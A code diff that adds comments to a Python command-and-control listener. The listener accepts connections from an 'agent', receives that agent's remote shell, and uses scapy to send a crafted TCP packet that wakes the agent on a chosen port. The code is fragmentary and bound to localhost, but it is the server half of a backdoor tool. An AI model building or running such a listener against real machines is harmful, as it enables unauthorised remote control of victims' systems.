@@ -7,9 +7,10 @@ from scapy.layers.l2 import Ether
 from scapy.layers.inet import IP
 from scapy.sendrecv import sendp
 
+#Servers address and port
 LHOST, LPORT = '127.0.0.1', 8080
 class TCPHandler(socketserver.BaseRequestHandler):
-
+    #Begins prompt and starts the receive thread
     def handle(self):
         global _CLEAN
         recvthread = threading.Thread(target=self.recv_message, args=())
@@ -29,6 +30,7 @@ class TCPHandler(socketserver.BaseRequestHandler):
                 print(e)
                 continue
 
+    #A thread that listens for data from the agent
     def recv_message(self):
         while True:
             try:
@@ -42,7 +44,7 @@ class TCPHandler(socketserver.BaseRequestHandler):
                 print(e)
                 TCPServer(LHOST, LPORT)
 
-#Starts the server and contains the main method
+#Main class starts the tcp server
 class TCPServer:
 
     def __init__(self, LHOST, LPORT):
@@ -53,15 +55,18 @@ class TCPServer:
         self.check_connections_process = threading.Thread(target=(self.check_for_connections), args=(), daemon=True).start()
         self.main()
 
+    #Send TCP packet on selelcted listening port to agent
     def ping(self, port):
         print("pinging")
         packet = (Ether()/IP(src='127.0.0.1', dst='127.0.0.1')/TCP(sport=8976, dport=port))
         sendp(packet)
         print('sent')
 
+    #Start TCPHandler instance as thread to receive agent shell
     def start_handler(self, conn, addr):
         self.server.finish_request(conn, addr)
 
+    #Main prompt to handle connections
     def main(self):
         command_list = ["help", "list", "connect"]
         print("Type help for a list of commands")
@@ -91,6 +96,7 @@ class TCPServer:
             except IndexError and TypeError and ValueError:
                 continue
 
+    #Checks for connections to server
     def check_for_connections(self):
         while True:
             sock_obj, addr = self.server.get_request()
